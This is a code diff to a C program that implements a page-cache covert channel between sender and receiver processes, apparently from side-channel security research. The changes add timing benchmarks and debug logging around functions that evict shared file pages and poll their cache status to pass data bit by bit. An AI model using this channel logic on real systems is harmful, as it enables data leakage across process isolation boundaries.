@@ -9,7 +9,8 @@
  * 
  *
  * Usage: ./covert_channel [message + ack file] [ready file] [-s|-r] <-t RUNS>
- *
+ *  or
+ * Usage: ./covert_channel [transmission file] [-s|-r] <-t RUNS>
  *	-s
  *		 Send mode.
  * 
@@ -49,6 +50,7 @@
 #include "config.h"
 #include "fca.h"
 #include "osal.h"
+//#define _DEBUG_
 #include "debug.h"
 
 /*-----------------------------------------------------------------------------
@@ -612,25 +614,45 @@ void configAttackFromDefines(Attack *attack)
 int sendBlock(TargetFile *message_ack_file, TargetFile *ready_file, uint8_t *data)
 {
     int ret = 0;
+    size_t cycle_start = 0, cycle_end = 0;
+    (void) cycle_start; (void) cycle_end;
     volatile uint8_t tmp = 0;
     uint8_t ack_status = 0;
     char mask = 1;
 
-    DEBUG_PRINT((DEBUG "Sender: Wait for ack.\n"));
+    DEBUG_PRINT((DEBUG INFO "Sender: Wait for ack.\n"));
+#ifdef _DEBUG_
+    TSC_BENCH_START(cycle_start);
+#endif
     // wait for ack
     do
     {
         getCacheStatusFilePage(&message_ack_file->mapping_, ACK_PAGE_OFFSET * PAGE_SIZE, &ack_status);
     } while (!(ack_status & 1) && running);
-    DEBUG_PRINT((DEBUG  "Sender: Got ack.\n"));
+#ifdef _DEBUG_    
+    TSC_BENCH_STOP(cycle_end);
+#endif
+    DEBUG_PRINT((DEBUG INFO "Sender: Got ack (took %zu ns).\n", tsc_bench_get_runtime_ns(cycle_start, cycle_end)));
 
+    DEBUG_PRINT((DEBUG INFO "Sender: Removing message + ack pages.\n"));
+#ifdef _DEBUG_    
+    TSC_BENCH_START(cycle_start);
+#endif
     // remove message + ack file pages
     if(cacheRemoveFilePages(&message_ack_file->mapping_, 0, MESSAGE_ACK_FILE_SIZE) != 0)
     {
         DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at cacheRemoveFilePages...\n", OSAL_EC)); 
         goto error;
     }
+#ifdef _DEBUG_
+    TSC_BENCH_STOP(cycle_end);
+#endif
+    DEBUG_PRINT((DEBUG INFO "Sender: Message + ack pages removed (took %zu ns).\n", tsc_bench_get_runtime_ns(cycle_start, cycle_end)));
 
+    DEBUG_PRINT((DEBUG INFO "Sender: Accessing message pages.\n"));
+#ifdef _DEBUG_    
+    TSC_BENCH_START(cycle_start);
+#endif
     // prefetch first (might benefit from asynchronous disk loads)
     for (size_t p = 0, b = 0; p < MESSAGE_FILE_SIZE / PAGE_SIZE; p++)
     {
@@ -661,7 +683,15 @@ int sendBlock(TargetFile *message_ack_file, TargetFile *ready_file, uint8_t *dat
             b++;
         }
     }
+#ifdef _DEBUG_    
+    TSC_BENCH_STOP(cycle_end);
+#endif    
+    DEBUG_PRINT((DEBUG INFO "Sender: Accessed message pages (took %zu ns).\n", tsc_bench_get_runtime_ns(cycle_start, cycle_end)));
 
+    DEBUG_PRINT((DEBUG INFO "Sender: Remapping + sending ready.\n"));
+#ifdef _DEBUG_    
+    TSC_BENCH_START(cycle_start);
+#endif
     // (re)map ready file
     if(mapFile(&ready_file->mapping_, "", FILE_ACCESS_READ | FILE_ACCESS_EXECUTE, MAPPING_SHARED | 
         MAPPING_ACCESS_READ) != 0)
@@ -672,7 +702,10 @@ int sendBlock(TargetFile *message_ack_file, TargetFile *ready_file, uint8_t *dat
 
     // send ready
     tmp += *((uint8_t *) ready_file->mapping_.addr_ + READY_PAGE_OFFSET * PAGE_SIZE);
-    DEBUG_PRINT((DEBUG "Sender: Send message + ready.\n"));
+#ifdef _DEBUG_
+    TSC_BENCH_STOP(cycle_end);
+#endif
+    DEBUG_PRINT((DEBUG INFO "Sender: Sent ready (took %zu ns).\n\n", tsc_bench_get_runtime_ns(cycle_start, cycle_end)));
 
     goto cleanup;
 error:
@@ -688,25 +721,45 @@ cleanup:
 int receiveBlock(TargetFile *message_ack_file, TargetFile *ready_file, uint8_t *data)
 {
     int ret = 0;
+    size_t cycle_start = 0, cycle_end = 0;
+    (void) cycle_start; (void) cycle_end;    
     volatile uint8_t tmp = 0;
     uint8_t ready_status = 0;
     char mask = 1;
     char byte = 0;
 
-    DEBUG_PRINT((DEBUG "Receiver: Wait for ready.\n"));
+    DEBUG_PRINT((DEBUG INFO "Receiver: Wait for ready.\n"));
+#ifdef _DEBUG_
+    TSC_BENCH_START(cycle_start);
+#endif    
     do
     {
         getCacheStatusFilePage(&ready_file->mapping_, READY_PAGE_OFFSET * PAGE_SIZE, &ready_status);
     } while (!(ready_status & 1) && running);
-    DEBUG_PRINT((DEBUG "Receiver: Got ready.\n"));
+#ifdef _DEBUG_
+    TSC_BENCH_STOP(cycle_end);
+#endif    
+    DEBUG_PRINT((DEBUG INFO "Receiver: Got ready (took %zu ns).\n", tsc_bench_get_runtime_ns(cycle_start, cycle_end)));
 
+    DEBUG_PRINT((DEBUG INFO "Receiver: Removing ready pages.\n"));
+#ifdef _DEBUG_    
+    TSC_BENCH_START(cycle_start);
+#endif
     // remove ready file pages
     if(cacheRemoveFilePages(&ready_file->mapping_, 0, READY_FILE_SIZE) != 0)
     {
         DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at cacheRemoveFilePages...\n", OSAL_EC)); 
         goto error;
     }
+#ifdef _DEBUG_
+    TSC_BENCH_STOP(cycle_end);
+#endif
+    DEBUG_PRINT((DEBUG INFO "Receiver: Ready pages removed (took %zu ns).\n", tsc_bench_get_runtime_ns(cycle_start, cycle_end)));
 
+    DEBUG_PRINT((DEBUG INFO "Receiver: Sampling message pages, sending ack.\n"));
+#ifdef _DEBUG_    
+    TSC_BENCH_START(cycle_start);
+#endif
     // (re)map message + ack file
     if(mapFile(&message_ack_file->mapping_, "", FILE_ACCESS_READ | FILE_NOATIME, MAPPING_SHARED | 
         MAPPING_ACCESS_READ) != 0)
@@ -737,7 +790,10 @@ int receiveBlock(TargetFile *message_ack_file, TargetFile *ready_file, uint8_t *
 
     // send ack
     tmp += *((uint8_t *) message_ack_file->mapping_.addr_ + ACK_PAGE_OFFSET * PAGE_SIZE);
-    DEBUG_PRINT((DEBUG "Receiver: Send ack.\n"));
+#ifdef _DEBUG_    
+    TSC_BENCH_STOP(cycle_end);
+#endif
+    DEBUG_PRINT((DEBUG INFO "Receiver: Sampled message pages, sent ack (took %zu ns).\n\n", tsc_bench_get_runtime_ns(cycle_start, cycle_end)));
 
     goto cleanup;
 error:
@@ -789,13 +845,13 @@ int sendBlock(Attack *attack, TargetFile *transmission_file, uint8_t *data)
     uint8_t ack_status = 0;
     char mask = 1;
 
-    DEBUG_PRINT((DEBUG "Sender: Wait for ack.\n"));
+    DEBUG_PRINT((DEBUG INFO "Sender: Wait for ack.\n"));
     // wait for ack
     do
     {
         getCacheStatusFilePage(&transmission_file->mapping_, ACK_PAGE_OFFSET * PAGE_SIZE, &ack_status);
     } while (!(ack_status & 1) && running);
-    DEBUG_PRINT((DEBUG  "Sender: Got ack.\n"));
+    DEBUG_PRINT((DEBUG INFO "Sender: Got ack.\n"));
 
     // remove transmission file pages
     if(fcaTargetsSampleFlushOnce(attack) == -1)
@@ -840,7 +896,7 @@ int sendBlock(Attack *attack, TargetFile *transmission_file, uint8_t *data)
     // send ready, advance to next ready
     tmp += *((uint8_t *) transmission_file->mapping_.addr_ + READY_PAGE_OFFSET[even] * PAGE_SIZE);
     even ^= 1;
-    DEBUG_PRINT((DEBUG "Sender: Send message + ready.\n"));
+    DEBUG_PRINT((DEBUG INFO "Sender: Send message + ready.\n"));
 
     goto cleanup;
 error:
@@ -859,12 +915,12 @@ int receiveBlock(Attack *attack, TargetFile *transmission_file, uint8_t *data)
     char mask = 1;
     char byte = 0;
 
-    DEBUG_PRINT((DEBUG "Receiver: Wait for ready %d.\n", even));
+    DEBUG_PRINT((DEBUG INFO "Receiver: Wait for ready %d.\n", even));
     do
     {
         getCacheStatusFilePage(&transmission_file->mapping_, READY_PAGE_OFFSET[even] * PAGE_SIZE, &ready_status);
     } while (!(ready_status & 1) && running);
-    DEBUG_PRINT((DEBUG "Receiver: Got ready %d.\n", even));
+    DEBUG_PRINT((DEBUG INFO "Receiver: Got ready %d.\n", even));
 
     // get message
     getCacheStatusFileRange(&transmission_file->mapping_, 0, MESSAGE_FILE_SIZE);
@@ -890,7 +946,7 @@ int receiveBlock(Attack *attack, TargetFile *transmission_file, uint8_t *data)
     even ^= 1;
     // send ack
     tmp += *((uint8_t *) transmission_file->mapping_.addr_ + ACK_PAGE_OFFSET * PAGE_SIZE);
-    DEBUG_PRINT((DEBUG "Receiver: Send ack.\n"));
+    DEBUG_PRINT((DEBUG INFO "Receiver: Send ack.\n"));
 
 //    goto cleanup;
 //error:
